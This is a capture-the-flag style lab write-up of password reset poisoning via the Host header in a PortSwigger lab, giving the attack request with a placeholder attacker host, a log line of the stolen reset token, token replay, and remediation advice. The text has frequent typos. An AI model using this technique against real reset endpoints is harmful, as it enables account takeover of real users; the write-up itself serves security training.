# Basic Password Reset Poisoning Through the Host Header

## Lab source and scope

This assessment was performed in the PortSwigger Web Security Academy lab **Basic password reset poisoning.**

The training environment provided a simulated victim who would follow links received by email and an attacker-controlled server for observing inbound requests.

## Security objective

Determine whether hte password-reset workflow used the request Host value when generating the absolute reset link sent to the user.

## Baseline request

A normal password-reset request looked like:

```http
POST /forgot-password HTTP/2
Host: <LAB_HOST>
Content_type: application/x-www-form-urlencoded

username=<VICTIM_USER>
```

The normal request caused the app to generate a reset message for the requested account.

## Testing approach

I repeated hte request while replacing hte Host value with the attacker-controlled origin:

```http
POST /forgot-password HTTP/2
Host: <ATTACKER_HOST>
Content-Type: application/x-www-form-urlencoded

username=<VICTIM_USER>
```

The application accepted the modified authority information and used it when building the reset URL.

## Evidence

The attacker-controlled server received a request containing hte password-reset token:

```http
GET /forgot-password?temp-forgot-password-token=als7iwktzwr7r8cct6m7ldrpmuxclyyj HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim)
```

This was the critical result: the reset secret generated for hte victim had crossed the trust boundary and reached attacker-controlled infrastructure.

## Validation

The captured token was then replayed against hte legitimate app:

```text
https://<LAB_HOST>/forgot-password?temp-forgot-password-token=<RESET_TOKEN>
```

The token was accepted by the legitimate reset workflow, allowing hte victim account password to be changed in the lab.

## Result

The password-reset mechanism trusted the client-controlled Host value when constructing an absolute security-sensitive URL.

This allowed a valid reset token to be sent to an attacker-controlled origin and then reused against hte legitimate app.

## Root cause

The app derived its public origin from untrusted request metadata instead of using a configured, trusted base URL.

The reset token itself did not need to be guessed or broken.

## Security impact

A real app with the same behavior could expose pasword-reset tokens and lead to account takeover when a victim follows the poisoned link.

The impact depends on the delivery mechanism, suer interaction, token lifetime, and whether additional controls are present.

## Remediation

- Generate security-sensitive links from a configured canonical origin
- Reject unexpected Host values at the edge
- Do not use client-controlled Host data as a trusted app setting
- Keep reset tokens short-lived, single-use, and scoped to the intended account
- Consider relative links where the delivery and app design allow it
- Log and investigate unexpected Host values on sensitive nedpoints

## What I learned

The interesting part of this test was that the taoken generation itself was strong. The account-compromise path existed because the app answered a different question incorrectly: *Which host should this secret be sent to?*

## Navigation

[Password reset poisoning overview](README.md) | [Assessment index](../../../README.md) | [Next: X-Forwarded-Host poisoning](02-poisoning-via-x-forwarded-host.md)
